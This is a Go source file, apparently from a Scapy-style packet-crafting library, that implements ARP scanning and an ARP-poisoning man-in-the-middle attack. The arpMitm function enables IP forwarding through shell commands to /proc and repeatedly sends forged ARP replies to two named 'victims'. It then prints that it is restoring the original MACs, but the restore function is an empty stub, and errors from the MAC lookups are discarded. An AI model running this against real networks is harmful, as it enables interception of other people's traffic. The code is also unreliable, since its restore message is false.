package higherlevel

import (
	"fmt"
	"github.com/google/gopacket/layers"
	"github.com/tiagomdiogo/GoPpy/packet"
	"github.com/tiagomdiogo/GoPpy/supersocket"
	"github.com/tiagomdiogo/GoPpy/utils"
	"log"
	"net"
	"os/exec"
	"time"
)

func ARPScan(iface string, targetIP string) (string, error) {
	// Get MAC address of interface
	srcMAC, err := utils.MacByInt(iface)
	if err != nil {
		return "", err
	}

	// Get IP address of interface
	srcIP := utils.ParseIPGen(iface)

	// Create a new SuperSocket
	ss, err := supersocket.NewSuperSocket(iface, "")
	if err != nil {
		return "", err
	}

	// Craft ARP Request Layer
	arpRequest := packet.ARPLayer()
	arpRequest.SetSrcMac(srcMAC)
	arpRequest.SetSrcIP(srcIP)
	arpRequest.SetDstIP(targetIP)
	arpRequest.SetRequest()
	arpRequest.SetDstMac("ff:ff:ff:ff:ff:ff")

	arpRequestPacket, err := packet.CraftPacket(arpRequest.Layer())
	if err != nil {
		return "", err
	}

	// Send ARP request
	err = ss.Send(arpRequestPacket)
	if err != nil {
		return "", err
	}

	// Read packets
	for {
		pkt, err := ss.Recv()
		if err != nil {
			return "", err
		}

		// Parse the packet
		arpLayer := utils.GetARPLayer(pkt)

		if arpLayer != nil && arpLayer.Operation == layers.ARPReply && net.IP(arpLayer.SourceProtAddress).String() == targetIP {
			ss.Close()
			return net.HardwareAddr(arpLayer.SourceHwAddress).String(), nil
		}
	}
}
func enableIPForwarding(iface string) {
	exec.Command("sh", "-c", "echo 1 > /proc/sys/net/ipv4/ip_forward").Run()
	exec.Command("sh", "-c", fmt.Sprintf("echo 0 > /proc/sys/net/ipv4/conf/%s/send_redirects", iface)).Run()
	exec.Command("sh", "-c", "echo 0 > /proc/sys/net/ipv4/conf/all/send_redirects").Run()
}

func disableIPForwarding() {
	exec.Command("sh", "-c", "echo 0 > /proc/sys/net/ipv4/ip_forward").Run()
}

func arpMitm(iface, victim1, victim2 string) {
	enableIPForwarding(iface)
	defer disableIPForwarding()

	fmt.Println("[*] Enabled IP Forwarding")

	ss, err := supersocket.NewSuperSocket(iface, "")
	if err != nil {
		log.Fatal(err)
	}

	macVictim1, err := ARPScan(iface, victim1)
	macVictim2, err := ARPScan(iface, victim2)

	fmt.Println("[*] Got MAC of the victims")
	fmt.Println(macVictim1)
	fmt.Println(macVictim2)

	arpPacket1, arpPacket2 := CreateFakeArp(victim1, victim2, macVictim1, macVictim2)

	for i := 0; i < 100; i++ {
		packet1, err := packet.CraftPacket(arpPacket1.Layer())
		if err != nil {
			log.Fatal(err)
		}
		packet2, err := packet.CraftPacket(arpPacket2.Layer())
		if err != nil {
			log.Fatal(err)
		}
		ss.Send(packet1)
		ss.Send(packet2)
		fmt.Println("[*] Sending Fake ARPs")

		time.Sleep(1 * time.Second)

	}
	fmt.Println("[*] Restoring original MAC")
	replaceOriginalARP()
}

func replaceOriginalARP() {
	return
}

func CreateFakeArp(victim1 string, victim2 string, macVictim1 string, macVictim2 string) (*packet.ARP, *packet.ARP) {
	arpPacket1 := packet.ARPLayer()
	arpPacket1.SetReply()
	arpPacket1.SetDstIP(victim1)
	arpPacket1.SetSrcIP(victim2)
	arpPacket1.SetDstMac(macVictim1)

	arpPacket2 := packet.ARPLayer()
	arpPacket2.SetReply()
	arpPacket2.SetDstIP(victim2)
	arpPacket2.SetSrcIP(victim1)
	arpPacket2.SetDstMac(macVictim2)
	return arpPacket1, arpPacket2
}
